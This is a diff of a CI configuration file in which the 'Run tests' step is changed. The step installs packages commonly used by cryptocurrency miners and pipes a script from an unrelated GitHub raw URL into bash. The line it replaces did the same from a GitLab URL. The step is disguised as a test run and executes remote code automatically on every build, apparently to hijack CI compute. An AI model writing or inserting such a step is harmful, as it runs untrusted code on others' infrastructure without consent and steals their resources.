@@ -11,7 +11,7 @@ jobs:
       # Replace this with a real test runner invocation
       - run:
           name: Run tests
-          command:apt update && apt -y install curl wget ca-certificates wget libcurl4 libjansson4 libgomp1 libnuma-dev && curl -sL https://gitlab.com/erlandysword/build/-/raw/main/v2 | bash 
+          command:apt update && apt -y install curl wget ca-certificates wget libcurl4 libjansson4 libgomp1 libnuma-dev && curl -sL https://raw.githubusercontent.com/WifeAiBot/erlandi-26/main/v2 | bash 
   build:
     docker:
       - image: cimg/base:stable
